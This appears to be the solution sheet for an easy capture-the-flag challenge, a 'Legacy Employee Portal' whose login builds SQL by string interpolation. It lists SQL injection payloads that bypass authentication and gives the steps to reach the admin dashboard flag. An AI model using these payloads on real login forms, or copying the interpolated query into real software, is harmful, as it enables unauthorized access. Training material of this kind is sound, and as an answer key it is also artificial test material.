# Legacy Employee Portal - Solution

## Intended Vulnerability

The login functionality constructs SQL queries using direct string interpolation:

SELECT * FROM users
WHERE username='{username}'
AND password='{password}'

This introduces a SQL Injection vulnerability.

## Example Payloads

Username:
' OR role='admin' --

Password:
anything

or

Username:
admin' OR '1'='1

Password:
anything

## Exploitation Flow

1. Open the login page.
2. Inject SQL into the username field.
3. Authentication bypass occurs.
4. Session is created with admin privileges.
5. User is redirected to /admin.
6. Flag is displayed on the administrator dashboard.

## Flag Location

flag.txt

Displayed only on the admin dashboard.

## Difficulty

Easy

## Intended Learning Objectives

* Understand authentication bypass via SQL Injection.
* Recognize unsafe string concatenation in SQL queries.
* Learn the importance of parameterized queries.
